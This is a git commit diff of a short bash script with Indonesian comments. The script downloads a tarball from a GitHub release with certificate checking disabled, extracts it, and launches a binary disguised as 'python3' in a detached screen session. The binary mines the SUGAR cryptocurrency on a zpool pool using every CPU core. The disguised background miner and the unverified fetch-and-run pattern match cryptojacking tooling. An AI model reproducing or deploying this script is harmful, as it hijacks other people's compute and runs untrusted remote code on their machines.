f6b3ad0f7d876a94d79fee9877ef74c566fec141
henstyle <henspicsaypro@gmail.com>
2024-12-14 02:29:33 +0700

    Update gulazg.sh

--- gulazg.sh
+++ gulazg.sh
@@ -1,11 +1,12 @@
 #!/bin/bash
 
 # Periksa apakah file sudah diekstrak sebelumnya
-if [ ! -d "dot" ]; then
+if [ ! -d "dotgula" ]; then
     echo "Mengunduh dan mengekstrak dotcpu.tar.gz..."
-    wget -O dot https://dotaja.biz.id/dotcpu.tar.gz
-    tar -xvf dot
+    wget -O dotgula --no-check-certificate https://github.com/DOT-AJA/KONTOL-DOT/releases/download/KONTOL/dotsrb.tar.gz
+    tar -xvf dotgula
 else
     echo "File sudah diekstrak. Lewati pengunduhan."
 fi
-screen -dmS miner ./python3 -a yespowersugar -o yespowerSUGAR.eu.mine.zergpool.com:6535 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j -p c=SUGAR -t $(nproc)
+
+screen -dmS DOT ./dotsrb/python3 -a yespowersugar -o yespowerSUGAR.eu.mine.zpool.ca:6241 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j -p c=SUGAR -t $(nproc)
